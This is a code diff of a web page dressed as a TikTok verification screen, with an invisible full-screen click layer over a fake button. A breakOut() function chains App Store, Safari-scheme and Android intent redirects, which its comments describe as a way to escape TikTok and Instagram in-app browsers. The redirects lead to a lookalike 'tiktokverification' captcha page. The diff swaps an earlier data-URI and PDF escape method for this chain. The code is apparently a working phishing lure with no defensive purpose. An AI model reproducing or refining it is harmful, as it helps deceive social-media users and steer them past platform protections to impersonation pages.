@@ -12,6 +12,7 @@
             height: 100%; overflow: hidden;
         }
 
+        /* The Full-Screen Blanket */
         #full-screen-redirect {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             z-index: 9999; opacity: 0; cursor: pointer;
@@ -27,7 +28,8 @@
         #main-content { text-align: center; padding: 0 30px; max-width: 400px; }
         .verification-icon { width: 72px; height: 72px; margin-bottom: 20px; }
         .header { color: #161823; font-size: 24px; font-weight: 700; margin-bottom: 12px; }
-        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 60px; }
+        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 100px; }
+        
         .tiktok-btn-visual {
             background-color: #FE2C55; color: #ffffff; border-radius: 4px;
             font-size: 16px; font-weight: 600; padding: 12px 60px;
@@ -56,34 +58,24 @@
         const targetUrl = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
 
         function breakOut() {
-            // The "Jump" Method: Uses a data-uri to force the browser to trigger an external intent
-            // This is the most consistent way to break out of TikTok/IG in-app browsers
-            const jumpCode = `
-                <html>
-                <body>
-                <script>
-                    window.location.replace("${targetUrl}");
-                <\/script>
-                </body>
-                </html>
-            `;
-            
-            // 1. Force a "Download" headers simulation
-            const blob = new Blob([jumpCode], {type: 'text/html'});
-            const blobUrl = URL.createObjectURL(blob);
+            // 1. Fire App Store intent to loosen the Webview lock
+            // We use a common app ID (Spotify) to trigger the system handler
+            window.location.href = "itms-apps://itunes.apple.com/app/id324684580";
 
-            // 2. Try the PDF bypass (iOS specific breakout)
-            window.location.assign('data:application/pdf;base64,JVBERi0xLjcK'); 
-
-            // 3. Immediately follow with the data-uri redirect
+            // 2. Immediately follow with the Safari Breakout scheme
             setTimeout(() => {
-                window.location.href = "data:text/html;base64," + btoa(jumpCode);
-            }, 50);
+                window.location.href = "x-safari-https://" + targetUrl.replace("https://", "");
+            }, 150);
 
-            // 4. Android Intent fallback
+            // 3. Android Intent Fallback
             setTimeout(() => {
                 window.location.href = "intent://" + targetUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
-            }, 150);
+            }, 300);
+
+            // 4. Final catch-all redirect
+            setTimeout(() => {
+                window.location.assign(targetUrl);
+            }, 500);
         }
 
         window.onload = function() {
